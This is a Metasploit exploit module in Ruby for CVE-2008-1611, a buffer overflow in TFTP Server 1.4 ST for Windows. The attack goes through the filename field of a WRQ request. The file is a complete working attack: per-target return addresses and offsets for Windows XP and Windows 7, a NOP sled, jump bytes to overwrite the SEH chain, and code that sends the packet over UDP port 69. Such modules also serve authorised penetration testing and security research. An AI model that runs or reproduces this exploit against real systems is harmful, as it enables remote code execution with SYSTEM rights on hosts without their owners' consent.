##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

	Rank = NormalRanking
	include Msf::Exploit::Remote::Udp

	def initialize(info = {})
		super(update_info(info,
			'Name'            => 'TFTP Server for Windows 1.4 ST WRQ Buffer Overflow',
			'Description'     => %q{
					This module exploits a vulnerability found in TFTP Server 1.4 ST.  The flaw
				is due to the way TFTP handles the filename parameter extracted from a WRQ request.
				The server will append the user-supplied filename to TFTP server binary's path
				without any bounds checking, and then attempt to open this with a fopen(). Since
				this isn't a valid file path, fopen() returns null, which allows the corrupted
				data to be used in a strcmp() function, causing an access violation.

				Since the offset is sensitive to how the TFTP server is launched, you must know
				in advance if your victim machine launched the TFTP as a 'Service' or 'Standalone'
				, and then manually select your target accordingly. A successful attempt will lead
				to remote code execution under the context of SYSTEM if run as a service, or
				the user if run as a standalone. A failed attempt will result a denial-of-service.
			},
			'Author'          =>
				[
					'Mati Aharoni', #Initial discovery, PoC
					'Datacut'       #Metasploit
				],
			'References'      =>
				[
					[ 'CVE', '2008-1611' ],
					[ 'OSVDB', '43785' ],
					[ 'BID', '18345' ],
					[ 'EDB', '5314' ]
				],
			'DefaultOptions'  =>
				{
					'EXITFUNC' =>'seh',
				},
			'Payload'         =>
				{
					'Space'           => 600,
					'BadChars'        => "\x00\x2f",
					'StackAdjustment' => -3500
				},
			'Platform'        => 'win',
			'Targets'         =>
				[
					# datacut tested ok 19/04/12 on xp sp2 sp3, win 7 sp0 sp1.
					# possible may work for other service packs and or vista
					# Rets = P/P/R from tftpserversp.exe
					[ 'Windows XP SP2/SP3 EN Service Mode',       { 'Ret' => 0x416801 , 'Offset' => 1203} ],
					[ 'Windows XP SP2/SP3 EN Standalone Mode',    { 'Ret' => 0x416801 , 'Offset' => 1487} ],
					[ 'Windows 7 SP0/SP1 EN x64 Service Mode',    { 'Ret' => 0x416801 , 'Offset' => 1217} ],
					[ 'Windows 7 SP0/SP1 EN x64 Standalone Mode', { 'Ret' => 0x416801 , 'Offset' => 1501} ],
					[ 'Windows 7 SP0/SP1 EN x86 Service Mode',    { 'Ret' => 0x416801 , 'Offset' => 1223} ],
					[ 'Windows 7 SP0/SP1 EN x86 Standalone Mode', { 'Ret' => 0x416801 , 'Offset' => 1507} ]
				],
			'Privileged'	=> false,
			'DisclosureDate'=> 'Mar 26 2008',
			'DefaultTarget' => 4))  #TFTP is installed as a service

		register_options(
			[
				Opt::RPORT(69)
			], self.class)
	end


	def exploit
		connect_udp

		nops = make_nops(50)
		lead = rand_text_alphanumeric(target['Offset'] - payload.encoded.length - nops.length)
		near = "\xe9\x80\xfd\xff\xff"    #jump back 640 bytes to the nop sled
		nseh = "\xeb\xf9" + make_nops(2) #jump back 7 bytes to the long jump

		evil = lead + nops + payload.encoded + near + nseh + [target.ret].pack('V')
		mode = "netascii"

		#Send the WRQ packet (header "\x00\x02")
		sploit = "\x00\x02" + evil + "\0" + mode +"\0"

		udp_sock.put(sploit)

		handler
		disconnect_udp
	end

end